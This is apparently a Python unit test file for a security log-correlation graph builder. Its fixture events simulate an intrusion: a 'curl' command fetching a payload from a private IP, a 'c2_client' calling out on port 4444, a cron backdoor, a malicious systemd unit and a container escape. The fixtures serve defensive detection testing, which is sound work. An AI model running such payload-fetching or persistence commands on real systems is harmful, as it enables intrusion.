"""Unit tests for HostGraphBuilder multi-layer correlation (Milestone M6.8)."""

from datetime import datetime, timezone
from logintel.correlation.host_graph import HostGraphBuilder
from logintel.correlation.host_graph_models import HostEdgeType, HostNodeType


def test_host_graph_builder_process_ancestry_and_execution():
    """Verify HostGraphBuilder links parent-child processes and user execution."""
    builder = HostGraphBuilder()
    events = [
        {
            "id": "ev-01",
            "host": "workstation-01",
            "username": "alice",
            "pid": 5001,
            "ppid": 1000,
            "process_name": "bash",
            "event_type": "PROCESS_EXECUTION",
            "summary": "User alice spawned bash",
            "timestamp": "2026-10-06T10:00:00Z",
            "metadata": {"command_line": "/bin/bash", "pid": 5001, "ppid": 1000},
        },
        {
            "id": "ev-02",
            "host": "workstation-01",
            "username": "alice",
            "pid": 5002,
            "ppid": 5001,
            "process_name": "curl",
            "event_type": "PROCESS_EXECUTION",
            "summary": "bash spawned curl",
            "timestamp": "2026-10-06T10:00:05Z",
            "metadata": {"command_line": "curl http://192.168.1.100/payload", "pid": 5002, "ppid": 5001},
        },
    ]

    graph = builder.build_from_events(host="workstation-01", events=events)
    assert graph.host == "workstation-01"

    # Verify nodes
    node_types = {n.node_type for n in graph.nodes}
    assert HostNodeType.HOST in node_types
    assert HostNodeType.USER in node_types
    assert HostNodeType.PROCESS in node_types

    # Verify edge types: SPAWNED and EXECUTED
    edge_types = {e.edge_type for e in graph.edges}
    assert HostEdgeType.SPAWNED in edge_types
    assert HostEdgeType.EXECUTED in edge_types
    assert HostEdgeType.AUTHENTICATED_TO in edge_types


def test_host_graph_builder_multi_layer_telemetry():
    """Verify builder links network, filesystem, systemd, and container layers."""
    builder = HostGraphBuilder()
    events = [
        # Network outbound connection
        {
            "id": "net-01",
            "host": "srv-prod",
            "pid": 6000,
            "process_name": "c2_client",
            "dst_ip": "203.0.113.55",
            "event_type": "NETWORK_CONNECTION_OUTBOUND",
            "timestamp": "2026-10-06T10:10:00Z",
            "metadata": {"dst_port": 4444, "pid": 6000},
        },
        # Persistence write
        {
            "id": "fs-01",
            "host": "srv-prod",
            "pid": 6000,
            "process_name": "c2_client",
            "event_type": "PERSISTENCE_TARGET_MODIFIED",
            "timestamp": "2026-10-06T10:10:02Z",
            "metadata": {"path": "/etc/cron.d/backdoor", "pid": 6000},
        },
        # Systemd unit
        {
            "id": "sys-01",
            "host": "srv-prod",
            "pid": 6000,
            "process_name": "c2_client",
            "event_type": "SYSTEMD_UNIT_START",
            "timestamp": "2026-10-06T10:10:03Z",
            "metadata": {"unit_name": "malicious.service", "pid": 6000},
        },
        # Container escape
        {
            "id": "cont-01",
            "host": "srv-prod",
            "pid": 6000,
            "process_name": "c2_client",
            "event_type": "CONTAINER_SECURITY_ESCAPE_ATTEMPT",
            "summary": "Container escape detected",
            "timestamp": "2026-10-06T10:10:04Z",
            "metadata": {"container_id": "c7a8b9c0d1e2", "pid": 6000},
        },
    ]

    graph = builder.build_from_events(host="srv-prod", events=events)
    assert graph.host == "srv-prod"

    node_types = {n.node_type for n in graph.nodes}
    assert HostNodeType.IP in node_types
    assert HostNodeType.FILE in node_types
    assert HostNodeType.SERVICE in node_types
    assert HostNodeType.CONTAINER in node_types

    edge_types = {e.edge_type for e in graph.edges}
    assert HostEdgeType.CONNECTED_TO in edge_types
    assert HostEdgeType.ACCESSED_FILE in edge_types
    assert HostEdgeType.MANAGED_BY in edge_types
    assert HostEdgeType.ESCAPED_FROM in edge_types
